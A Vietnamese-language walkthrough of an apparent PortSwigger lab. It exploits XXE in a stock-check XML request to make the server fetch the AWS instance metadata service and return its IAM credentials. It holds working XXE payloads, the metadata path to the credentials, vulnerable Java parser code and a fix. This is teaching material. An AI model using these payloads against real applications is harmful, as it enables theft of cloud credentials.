![](../assets/Pasted%20image%2020261116231201.png)

# 1. Mục tiêu

Tiếp tục khai thác chức năng Check stock để lấy được IAM secret access key tận dụng việc sử dụng DTD và external entity. IMDS là dịch vụ nội bộ giúp mỗi EC2 instance tự truy vấn danh tính và cấu hình của chính nó. Nó đặt ở địa chỉ link-local cố định `169.254.169.254` để mọi instance truy cập đồng nhất mà không cần DNS, và chỉ gọi được từ bên trong instance. Request không rời khỏi máy mà được hypervisor trả lời theo đúng instance gửi đi — nên SSRF từ ứng dụng trên instance sẽ nhận về chính thông tin xác thực IAM của máy đó.

# 2. Recon
![](../assets/Pasted%20image%2020261117094758.png)
Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.

Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request
```http
POST /product/stock HTTP/2
Host: 0a40003a04de7a0480d5264300b300ac.web-security-academy.net
Cookie: session=oRSLWSnYKDQdaretRFfNDp7tG2td8EHX
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0a40003a04de7a0480d5264300b300ac.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a40003a04de7a0480d5264300b300ac.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?><stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```

HTTP Response
```http
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

713
```

# 3. Exploit
Sử dụng DTD với external entity trỏ tới địa chỉ của lab server
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY xxe SYSTEM "http://169.254.169.254/" >]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

![](../assets/Pasted%20image%2020261117101248.png)

Response trả về chữ `latest`. Dễ nhầm đây là một thư mục, nhưng **không phải** — `latest` chính là **nội dung thật** mà URL gốc `/` trả về. IMDS là một **API có đánh phiên bản**: gọi vào gốc thì nó liệt kê các phiên bản sẵn có (các năm `2009-04-04`, `2016-09-02`...), và `latest` là alias trỏ tới phiên bản mới nhất. Mỗi dòng nhận được là **nội dung của URL đó**, không phải listing thư mục. Tiếp tục ghép `latest` vào URL và lần theo cấu trúc API.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest" >]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](../assets/Pasted%20image%2020261117101639.png)

Response tiếp tục trả về đường dẫn phía trong, tiếp tục thêm vào URL và dò cho tới khi đến được điểm cuối cùng

```http
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```

Vì sao phải dò từng bước mà không nhảy thẳng tới đích? Vì **tên role là thứ không đoán được** — mỗi máy một khác. Cấu trúc đường dẫn `/latest/meta-data/iam/security-credentials/` thì có tài liệu công khai, nhưng bước áp chót — gọi vào đúng path đó để nó **trả về tên role** (`admin`) — là bước bắt buộc phải dò, lấy tên rồi mới ghép tiếp vào URL để moi ra JSON chứa key.

![](../assets/Pasted%20image%2020261117101837.png)

Response trả về toàn bộ credential IAM: `AccessKeyId`, `SecretAccessKey`, `Token` và `Expiration`. Hoàn thành lab.
![](../assets/Pasted%20image%2020261117101928.png)

> **Vì sao IMDS lại nằm ở một IP, và vì sao SSRF từ instance lại lấy được đúng key của nó?** Mỗi EC2 khởi tạo từ chung một AMI, nên danh tính riêng (instance ID, cấu hình, IAM key tạm) **không nằm trên đĩa** mà phải "hỏi môi trường lúc boot" — IMDS chính là nơi trả lời. Nó đặt ở **IP cố định** `169.254.169.254` vì lúc boot DNS có thể chưa chạy, và địa chỉ phải giống nhau trên mọi máy để SDK hard-code được. Dải `169.254.x.x` là **link-local**: gói tin không rời khỏi máy, bên ngoài không gọi vào được → nên mới phải mượn SSRF từ chính ứng dụng. Mấu chốt: **IP này không phải một máy chủ** — hypervisor chặn gói và trả metadata theo đúng instance đã gửi. Cùng một IP, mỗi máy nhận một câu trả lời khác nhau, nên SSRF phát đi từ instance nào thì nhận về IAM key của chính instance đó.

> **Cạm bẫy thứ tự — lỗi "Scanner State 24 not Recognized":** nếu lỡ đặt `DOCTYPE` **bên trong** thẻ `<stockCheck>` sẽ dính lỗi này. Theo luật XML, `DOCTYPE` phải nằm **trước thẻ gốc**, ngay sau khai báo `<?xml?>`. Thứ tự đúng luôn là: `<?xml?>` → `<!DOCTYPE ...>` → thẻ gốc.
# 4. Mô phỏng backend xử lý
Backend giống hệt LAB01 (parser Java bật external entity, phản chiếu `productId` ra lỗi), chỉ khác là lần này `&xxe;` trỏ tới một URL `http://` nên nội dung phản chiếu là kết quả SSRF chứ không phải nội dung file:

```java
// Parser bật DTD + external entity -> cấu hình nguy hiểm
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);

Document doc = dbf.newDocumentBuilder().parse(input);   // &xxe; = nội dung URL 169.254.169.254 được fetch ở đây
String productId = doc.getElementsByTagName("productId").item(0).getTextContent();
return "\"Invalid product ID: " + productId + "\"";     // productId giờ chứa credential IAM -> phản chiếu ra response
```

# 5. Cách vá
```java
// Tắt DTD -> dập mọi biến thể XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load DTD nếu ứng dụng không dùng tới chức năng đó. Loại bỏ cả việc phản chiếu lại response ra ngoài nếu không cần thiết. Chỉ cần báo lỗi chung chung như "Invalid product ID or storeID".